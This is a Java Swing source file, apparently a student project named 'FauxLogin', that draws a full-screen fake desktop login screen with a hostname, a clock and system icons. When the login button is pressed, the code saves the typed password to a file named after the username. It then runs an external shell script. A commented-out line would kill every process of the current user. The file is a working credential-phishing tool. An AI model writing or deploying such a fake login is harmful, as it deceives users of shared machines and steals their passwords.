import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.geom.RoundRectangle2D;
import java.io.FileWriter;
import java.io.IOException;

public class PleinEcranFrame extends JFrame implements ActionListener
{
    private Image fond;
    private Image shutdown;
    private Image accessible;
    private Image parametre;
    private Image login;

    private ButtonCool btnConnexion;
	private ButtonCool btnAnnuler;

	private TextFieldCool txtIdentifiant;
	//private PasswordFieldCool txtMotPasse;
    private TextFieldCool txtMotPasse;

    public PleinEcranFrame() 
    {
        GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
        setUndecorated(true);
        device.setFullScreenWindow(this);

        try {
            Thread.sleep(500);
        } catch (Exception e) {}
        
        this.setLayout(null);

        int larg2 = 350, haut2 = 200;
        int x2 = getWidth()/2 - larg2/2, y2 = getHeight()/2 - haut2/2;

        this.btnConnexion = new ButtonCool("Se connecter");
		this.btnConnexion.addActionListener(this);
        
		this.btnAnnuler = new ButtonCool("Annuler");
		this.btnAnnuler.addActionListener(this);
        
		this.txtIdentifiant = new TextFieldCool(false ,"Saisissez votre nom d'util...", this);

		this.txtMotPasse = new TextFieldCool(true, "Saisissez votre mot de ...", this);

        //placement elem
        this.btnConnexion  .setBounds(x2 + 205, y2 + 130, 120, 35);
        this.btnAnnuler    .setBounds(x2 + 25 , y2 + 130, 90 , 35);
        this.txtIdentifiant.setBounds(x2 + 130, y2 + 35 , 195, 35);
        this.txtMotPasse   .setBounds(x2 + 130, y2 + 80 , 195, 35);

        this.add(this.btnConnexion);
        this.add(this.btnAnnuler);
        this.add(this.txtIdentifiant);
        this.add(this.txtMotPasse);

        fond = new ImageIcon("./image/test.png").getImage();//./image/marche.png
        shutdown = new ImageIcon("./image/shutdown.png").getImage();
        accessible = new ImageIcon("./image/bonhommecontent.png").getImage();
        parametre = new ImageIcon("./image/configuration.png").getImage();
        login = new ImageIcon("./image/login.jpg").getImage();

        
        setVisible(true);
    }

    @Override
    public void paint(Graphics g) 
    {
        super.paint(g);
        Graphics2D g2d = (Graphics2D) g;
        
        //g.drawImage(fond, -50, 0, getWidth() + 100, getHeight(), this);
        g.drawImage(fond, 0, 0, getWidth(), getHeight(), this);

        g.setColor(Color.DARK_GRAY);
        g.fillRect(-50, 0, getWidth() + 100, 25);

        g.setColor(Color.WHITE);
        g.drawString("di-720-08", (getWidth()/2) + 200, 18);

        Font fontGras = new Font("Arial", Font.BOLD, 12);
        g2d.setFont(fontGras);
        g2d.drawString("ven., 13:45", getWidth() - 120, 16);

        g.drawImage(parametre, getWidth() - 180, 2, 18, 18, this);
        g.drawImage(accessible, getWidth() - 150, 2, 18, 18, this);
        g.drawImage(shutdown, getWidth() - 30, 2, 18, 18, this);

        //ombrage
        int larg = 400, haut = 225;
        int x = getWidth()/2 - larg/2, y = getHeight()/2 - haut/2;
        for(int i=0; i < 50; i++)
		{
			g.setColor(new Color(0,0,0,i));
			g.fillRect(x + i, y + i, larg - i*2, haut - i*2);
		}

        //panel blanc
        g2d.setColor(Color.WHITE);
        g2d.fill(new RoundRectangle2D.Double(x + 20, y + 20, larg - 40, haut - 40, 10, 10)); 

        g.drawImage(login, x + 55, y + 55, 75, 75, this);

        g2d.dispose();
    }

    public static void main(String[] args) 
    {
        SwingUtilities.invokeLater(PleinEcranFrame::new);
    }

    @Override
	public void actionPerformed(ActionEvent e) 
	{
		if(e.getSource() == this.btnConnexion)
		{
            creationFichier();
            test2();
		}

		if(e.getSource() == this.btnAnnuler)
		{
            this.txtIdentifiant.reset();
            this.txtMotPasse.reset();
		}
	}

    public void next(int nb)
    {
        switch (nb) 
        {
            case 1: this.txtMotPasse.requestFocus(); break;
            case 2: this.btnConnexion.doClick();
        
            default:
                break;
        }
    }

    public void creationFichier()
    {
        try
        {
            FileWriter writer = new FileWriter(this.txtIdentifiant.getText()+".txt");

            try 
            {
                writer.write(this.txtMotPasse.getMotPasse() + "");
            } 
            finally 
            {
                if (writer != null) 
                {
                    writer.close();
                }
            }
        }
        catch(IOException ex){}
        //test2();
    }

    public void test2()
    {
        try {
            // Exécute la commande
            //@SuppressWarnings("deprecation")
            //Process process = Runtime.getRuntime().exec("termit -e \"pkill -KILL -u $USER\"");
            Process process = Runtime.getRuntime().exec("mate-terminal -e \"/home/etudiant/sm220306/MesJeux/FauxLogin/test.sh\"");

            // Attend que la commande se termine
            process.waitFor();

            // Récupère le code de sortie de la commande
            int exitCode = process.exitValue();
            System.out.println("La commande s'est terminée avec le code de sortie : " + exitCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
}
